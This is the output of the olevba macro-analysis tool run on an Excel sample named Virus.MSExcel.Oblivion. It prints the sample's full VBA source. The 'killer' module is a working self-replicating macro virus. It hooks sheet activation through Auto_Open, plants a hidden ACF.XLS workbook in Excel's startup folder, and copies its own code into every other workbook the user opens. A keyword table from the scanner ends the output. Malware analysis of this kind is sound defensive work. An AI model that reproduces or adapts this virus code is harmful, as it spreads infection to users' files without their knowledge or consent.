olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Oblivion-c68f3467a0efa630addd794492433d20693f369f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Oblivion-c68f3467a0efa630addd794492433d20693f369f - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Oblivion-c68f3467a0efa630addd794492433d20693f369f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Oblivion-c68f3467a0efa630addd794492433d20693f369f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Oblivion-c68f3467a0efa630addd794492433d20693f369f - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO killer.bas 
in file: Virus.MSExcel.Oblivion-c68f3467a0efa630addd794492433d20693f369f - OLE stream: '_VBA_PROJECT_CUR/VBA/killer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







Sub Auto_Open()
    Application.OnSheetActivate = "kill"
End Sub
Sub KILL()
    sStpath = Application.StartupPath
    vname = Dir(sStpath & "\" & "ACF.XLS")
    If UCase(vname) = "ACF.XLS" Then
        p = 1
    Else
        p = 0
    End If
    If UCase(ActiveWorkbook.Name) = "ACF.XLS" Then
        ActiveWindow.Visible = False
    Else
        Select Case p
            Case 1
                Application.ScreenUpdating = False
                oldfname = ActiveWorkbook.Name
                thisfname = ThisWorkbook.Name
                NumOfCmp = ActiveWorkbook.VBProject.VBComponents.Count
                For n = 1 To NumOfCmp
                    ntype = ActiveWorkbook.VBProject.VBComponents(n).Type
                   If ntype = 1 And ActiveWorkbook.VBProject.VBComponents(n).Name = "killer" Then
                        w = 1
                        Exit For
                    Else
                        If n = NumOfCmp Then
                            w = 0
                            ActiveWorkbook.VBProject.VBComponents.Add (1)
Set Acts1 = Workbooks(oldfname).VBProject.VBComponents(n + 1)
Set shashou = Workbooks(thisfname).VBProject.VBComponents("killer")
                            ssCl = shashou.CodeModule.CountofLines
                            For i = 1 To ssCl
                            Acts1.CodeModule.InsertLines i, shashou.CodeModule.Lines(i, 1)
                           Next i
                            Acts1.Name = "killer"
                        End If
                    End If
                Next n
                Application.ScreenUpdating = True
            Case 0
                Application.ScreenUpdating = False
                thisfname = ThisWorkbook.Name
                Workbooks.Add
                With ActiveWorkbook
                    .Title = ""
                    .Subject = ""
                    .Author = ""
                    .Keywords = ""
                    .Comments = ""
                End With
                newfname = ActiveWorkbook.Name
                NumOfCmp = ActiveWorkbook.VBProject.VBComponents.Count
                For n = 1 To NumOfCmp
                    ntype = ActiveWorkbook.VBProject.VBComponents(n).Type
                    If ntype = 1 Then
                        w = 1
                        Exit For
                    Else
                        If n = NumOfCmp Then
                            w = 0
                            ActiveWorkbook.VBProject.VBComponents.Add (1)
                        End If
                    End If
                Next n
                Set Acts1 = Workbooks(newfname).VBProject.VBComponents(n)
                Set shashou = Workbooks(thisfname).VBProject.VBComponents("killer")
                ssCl = shashou.CodeModule.CountofLines
                For i = 1 To ssCl
                Acts1.CodeModule.InsertLines i, shashou.CodeModule.Lines(i, 1)
                Next i
                Acts1.Name = "killer"
                Workbooks(newfname).SaveAs FileName:=sStpath & "\" & "BOOK1.XLS"
                Workbooks("BOOK1.XLS").SaveAs FileName:=sStpath & "\" & "ACF.XLS"
                Windows("ACF.XLS").Visible = False
                Workbooks("ACF.XLS").Save
                Application.OnSheetActivate = ""
                Application.ScreenUpdating = True
                Application.OnSheetActivate = "ACF.XLS!kill"
        End Select
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

